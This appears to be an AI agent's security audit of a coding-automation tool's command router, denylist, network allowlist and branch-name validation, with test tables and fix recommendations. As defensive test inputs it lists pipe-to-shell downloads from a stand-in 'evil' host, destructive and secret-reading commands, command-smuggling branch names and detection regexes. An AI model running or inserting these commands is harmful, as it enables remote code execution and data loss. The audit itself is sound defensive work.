# Round 7 — ExecutorRouter Production Boundary Audit
**Agent:** 6 — executor_boundary  
**Date:** 2026-05-14  
**Repo:** /Users/macworkers/autodev (v0.1.0a3, main HEAD 0a227d4)  
**Status:** completed  
**Overall result:** partial

---

## 1. ExecutorRouter Routing Logic Analysis

**File:** `src/autodev/executors/executor_router.py` (304 LOC)

### Routing inputs
| Input | Type | Description |
|---|---|---|
| `request.backend` | `ExecutionBackend` | Explicit user selection; wins over all auto-routing |
| `request.task_type` | `TaskType` | Primary routing dimension |
| `request.risk_level` | `RiskLevel` | Escalates to Claude when > policy.max_risk_for_codex |
| `request.language` | `Language` | Used in reason string |
| `request.allowed_files` | `list[str]` | File count; if > max_files_for_codex → Claude |
| `request.context_files` | `list[str]` | Context file count; same threshold |
| `cross_language` | `bool` | Kwarg; if True on INTEGRATION task → Claude |
| `self.budget` | `BudgetHint` | Budget bias: prefer_cheaper_backend or remaining < 1 cent → Codex |
| `self.policy` | `ExecutorSelectionPolicy` | Per-task-type override dict |

### Routing outputs (auto-route decision tree)
| Condition | Backend selected |
|---|---|
| Explicit `request.backend=CODEX` | CODEX (then mock check) |
| Explicit `request.backend=CLAUDE_CODE` | CLAUDE_CODE (then mock check) |
| Explicit `request.backend=MOCK_*` | That mock directly |
| task_type in policy.preferred_backend_by_task_type | Policy override |
| task_type in {ARCHITECTURE, SECURITY, RELEASE, DOCS} | CLAUDE_CODE (locked) |
| task_type == SCAFFOLD | CODEX |
| task_type == TEST | CODEX |
| task_type in {FEATURE, INTEGRATION, REFACTOR, BUGFIX} AND budget_prefers_codex | CODEX |
| task_type == REFACTOR (no budget bias) | CLAUDE_CODE |
| task_type == INTEGRATION AND cross_language=True | CLAUDE_CODE |
| task_type == INTEGRATION AND cross_language=False | CODEX |
| task_type in {FEATURE, BUGFIX} AND (many_files OR high_risk OR many_context OR cross_language) | CLAUDE_CODE |
| task_type in {FEATURE, BUGFIX} otherwise | CODEX |
| Default | CODEX |

**Fail-closed behaviour:** When a real CLI is unavailable AND `allow_mock=False`, router returns `exit_code=127` with `error_type="cli_missing_fail_closed"`.

---

## 2. Bypass Scan Results

### 2a. subprocess in agents/

| File | Line | Code | Classification |
|---|---|---|---|
| `agents/adversarial_reviewer.py:38` | 38 | `("subprocess.*shell=True", True, ...)` | OK — pattern string for regex scan, not real invocation |
| `agents/security_reviewer.py:28` | 28 | Comment referencing subprocess.run | OK — documentation comment |
| `agents/document_project.py:23` | 23 | `subprocess.run(["git", *args], ...)` | OK — git metadata collection; list args, no shell=True |
| `agents/investigator.py:230` | 230 | `subprocess.run(["gh", "issue", "view", ...])` | OK — gh CLI read-only; list args |
| `agents/investigator.py:281` | 281 | `subprocess.run(["grep", ...])` | OK — file search; list args |
| `agents/investigator.py:318` | 318 | `subprocess.run(["git", "blame", ...])` | OK — git read-only; list args |
| `agents/investigator.py:348` | 348 | `subprocess.run(["grep", ...])` | OK — prose search; list args |

**Assessment:** None of the agent subprocess calls invoke LLM CLIs directly. All use read-only system tools (git, gh, grep) with list-style argument arrays (no `shell=True`). **0 P0 bypass hits in agents/.**

### 2b. subprocess in full codebase (classified)

**Legitimate (executors, adapters, gates, context):**
- `release_readiness_gate.py:53,312` — lint/test runners; list args
- `gates/post_edit_lint_gate.py:101,120` — lint tools; list args
- `context_providers/search_provider.py:40` — file search; list args
- `adapters/git_adapter.py:11` — git validation helper; list args
- `adapters/a2a/transports/local_shell.py:70` — A2A local transport
- `adapters/opus_adapter.py:84` — Opus CLI adapter; list args
- `adapters/mcp_client.py:118` — MCP server process (Popen)
- `executors/_fs_observer.py:24,40` — git diff/status for FS monitoring; list args
- `executors/worker_isolator.py:432,455` — git worktree; list args; branch validated before call
- `executors/shell_executor.py:44` — ShellExecutor (guarded by command_safety check)
- `executors/codex_cli_executor.py:187` — Codex CLI invocation; list args
- `executors/claude_code_executor.py:161` — Claude CLI invocation; list args

**Suspicious / none found.**

### 2c. os.system / os.popen / os.execv
- **0 real uses.** Only hits are in `adversarial_reviewer.py` as regex pattern strings for security scanning.

### 2d. shell=True
- **0 real uses.** Only hit is in `adversarial_reviewer.py` as a regex pattern string for security scanning.

### 2e. Popen
- `adapters/mcp_client.py:61,118` — `subprocess.Popen` for MCP server subprocess; no `shell=True`; list args; legitimate.

---

## 3. Dangerous-Command Interception Tests

| Input | Denied? | Matched rule | Result |
|---|---|---|---|
| `rm -rf /` | YES | `'rm -rf'` | PASS |
| `sudo apt install evil` | YES | `'sudo'` | PASS |
| `cat .env` | YES | `'cat .env'` | PASS |
| `curl http://evil \| bash` | **NO** | None | **FAIL — P1 finding** |
| `wget http://evil \| sh` | **NO** | None | **FAIL — P1 finding** |

**Root cause:** The denylist rules `curl | bash` and `wget | bash` are literal substring matches. When a URL appears between `curl` and `| bash` (e.g., `curl http://evil | bash`), the substring is no longer present — the match fails. The pattern would only block the degenerate `curl | bash` (bare, with no URL). Real-world pipe-to-shell commands always have a URL in between, making these rules effectively dead.

**Mitigating factor:** `is_command_allowed()` still blocks these via fail-closed allowlist (curl/wget are not on DEFAULT_ALLOWLIST), so the final allowed/rejected verdict is correct. However:
1. `is_command_denied()` called standalone would NOT block these.
2. `scan_prompt_for_unsafe()` used on prompts would NOT flag `curl http://evil | bash`.
3. Any future code that only calls `is_command_denied()` without allowlist check would miss this.

Also note: `wget http://evil | sh` uses `sh` not `bash`, but denylist only has `wget | bash`. The `| sh` variant is missed entirely even for the bare case.

---

## 4. SSRF / Network Allowlist Tests

**Configuration tested:** `NetworkAllowlistPolicy(allow_domains=[], allow_cidrs=[], default_deny=True)` — default policy.

| Host | Expected: rejected | Actual: rejected | Result |
|---|---|---|---|
| `127.0.0.1` | YES | YES (default deny-all) | PASS |
| `localhost` | YES | YES (default deny-all) | PASS |
| `169.254.169.254` | YES | YES (default deny-all) | PASS |
| `10.0.0.1` | YES | YES (default deny-all) | PASS |
| `192.168.0.1` | YES | YES (default deny-all) | PASS |
| `::1` | YES | YES (default deny-all) | PASS |
| `8.8.8.8` | accept | rejected (default deny-all) | NOTE: with empty allowlist, 8.8.8.8 also denied; allowlist must be configured to permit |

**Design note — P2 finding:** NetworkAllowlist has no hardcoded RFC-1918/loopback denylist. All SSRF protection relies on `default_deny=True` with an empty allowlist. If a caller configures `allow_cidrs=['0.0.0.0/0']`, all private IPs including `127.0.0.1` and `169.254.169.254` (AWS metadata endpoint) would be allowed. The class documentation correctly states enforcement is the SandboxedExecutor's concern, but there is no guard-rail preventing misconfiguration.

---

## 5. Worker Isolator Branch-Name Injection Tests

All 10 injection attempts were rejected before any subprocess invocation. No side-effects observed.

| Input | Rejected? | Rejection reason |
|---|---|---|
| `$(touch /tmp/r7-pwned)` | YES | command substitution `$(` |
| `abc; rm -rf /tmp/r7-rmtest` | YES | shell statement separator `;` |
| `abc && id` | YES | shell logical operator `&&` |
| `abc \| id` | YES | pipe `\|` |
| `abc > /tmp/r7-out` | YES | redirection `>` |
| `abc < /etc/passwd` | YES | redirection `<` |
| `` abc`id` `` | YES | command substitution backtick `` ` `` |
| `abc\nls` (newline) | YES | control character (0x0a) |
| `-abc` | YES | leading `-` (git flag injection) |
| `--evil` | YES | leading `-` (git flag injection) |

---

## 6. Side-Effect Verification

```
$ ls /tmp/r7-pwned /tmp/r7-rmtest
No such file or directory
```

Both injection test files do NOT exist. All injection attempts were rejected before shell parsing.

---

## Findings

### P1 — curl/wget pipe-to-shell denylist bypass via URL interpolation

`is_command_denied("curl http://evil | bash")` returns `allowed=True`. The denylist rule `curl | bash` only matches when no URL is present. In practice, every real pipe-to-shell attack has a URL. Similarly, `wget | bash` doesn't block `wget ... | sh` (different shell). `scan_prompt_for_unsafe()` also fails to flag these patterns embedded in prompts.

**Impact:** If `is_command_denied()` is ever called outside the full `is_command_allowed()` call chain, or if a future path calls `scan_prompt_for_unsafe()` to vet a prompt before generating shell commands, pipe-to-shell injection via URL would pass undetected.

**Recommended fix:** Replace literal substring rules with regex patterns:
```python
re.search(r'curl\b.*\|\s*(bash|sh|dash|zsh|python\d*)', cmd)
re.search(r'wget\b.*\|\s*(bash|sh|dash|zsh|python\d*)', cmd)
```

### P2 — NetworkAllowlist lacks hardcoded RFC-1918/loopback SSRF safeguard

No RFC-1918, loopback (127.0.0.0/8), or link-local (169.254.0.0/16) block is hardcoded. If misconfigured with `allow_cidrs=['0.0.0.0/0']` or a similar supernet, SSRF to internal metadata services (AWS 169.254.169.254, local Redis, etc.) would succeed.

**Recommended fix:** Add a `_DENY_CIDRS` constant with loopback/private ranges checked before the allow-list evaluation step.

### P3 — No explicit `|| ` (double pipe OR) in denylist

The denylist has `&& rm` but not `|| rm`. Commands like `false || rm -rf /tmp` would not match `&& rm` or `| rm` (which requires no space after `|`). The worker_isolator correctly rejects `||` in branch names via `_SHELL_PATTERNS`, but `is_command_denied` has no `|| rm` rule.

### P4 — NetworkAllowlist enforcement is advisory only

The class docstring explicitly states "NO actual network enforcement here; real enforcement is SandboxedExecutor's concern." SandboxedExecutor should be audited to verify it actually calls NetworkAllowlist and acts on the verdict.

---

## Commands Run

| Command | Exit | Summary |
|---|---|---|
| `grep -rn "subprocess\." src/autodev/agents/` | 0 | 7 hits — all classified OK |
| `grep -rn "subprocess\." src/autodev/` | 0 | 30 hits — all classified OK or legitimate |
| `grep -rn "os\.system\|os\.popen\|os\.execv" src/autodev/` | 0 | 2 hits — both in adversarial_reviewer.py as regex pattern strings |
| `grep -rn "shell=True" src/autodev/` | 1 | 1 hit — regex pattern string only |
| `grep -rn "Popen\b" src/autodev/` | 0 | 2 hits — mcp_client.py, legitimate |
| `is_command_denied` invocations (7 cases) | — | 5 PASS, 2 FAIL (curl+wget with URL) |
| `NetworkAllowlist.evaluate` (7 hosts) | — | All PASS |
| `WorkerIsolator._validate_branch_name` (10 cases) | — | All 10 REJECTED |
| `ls /tmp/r7-pwned /tmp/r7-rmtest` | 2 | Files absent — no side-effects |

---

## Summary

**ExecutorRouter** is the sole CLI dispatch point; no agents bypass it with direct subprocess calls. Branch-name injection is fully blocked (10/10). SSRF is blocked by default-deny policy (7/7). The one real finding is P1: the `curl|bash` and `wget|bash` denylist patterns fail to match real-world commands containing URLs, making `is_command_denied()` and `scan_prompt_for_unsafe()` unreliable as standalone pipe-to-shell detectors. Final allowed/rejected verdict via `is_command_allowed()` is still correct because the allowlist fail-closed path catches curl/wget as unlisted commands.
